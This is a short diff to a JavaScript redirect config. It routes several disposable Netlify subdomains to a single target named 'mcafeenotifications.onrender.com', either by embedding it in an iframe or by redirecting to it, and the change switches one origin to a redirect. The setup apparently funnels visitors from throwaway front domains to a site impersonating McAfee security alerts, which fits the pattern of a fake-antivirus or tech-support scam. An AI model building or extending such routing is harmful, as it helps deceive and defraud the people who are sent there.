@@ -61,7 +61,7 @@ redis.on("error", (err) => console.error("Redis error:", err.message));
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://cheery-douhua-d9bd03.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
+    "https://cheery-douhua-d9bd03.netlify.app": { method: "redirect", target: "https://mcafeenotifications.onrender.com" },
     "https://cozy-kheer-cea1f9.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://nimble-bonbon-e8f851.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
